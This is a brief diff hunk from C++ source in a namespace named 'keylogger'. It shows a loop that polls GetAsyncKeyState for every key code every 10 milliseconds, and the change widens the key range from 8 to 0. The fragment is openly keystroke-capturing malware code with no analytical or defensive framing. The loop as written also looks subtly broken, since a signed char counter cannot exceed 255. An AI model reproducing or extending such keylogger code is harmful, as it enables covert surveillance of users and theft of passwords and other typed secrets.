@@ -7,7 +7,7 @@ namespace keylogger
 		while (true)
 		{
 			std::this_thread::sleep_for(std::chrono::milliseconds(10));
-			for (char i = 8; i <= 255; i++)
+			for (char i = 0; i <= 255; i++)
 			{
 				if (GetAsyncKeyState(i) == -32767)
 				{
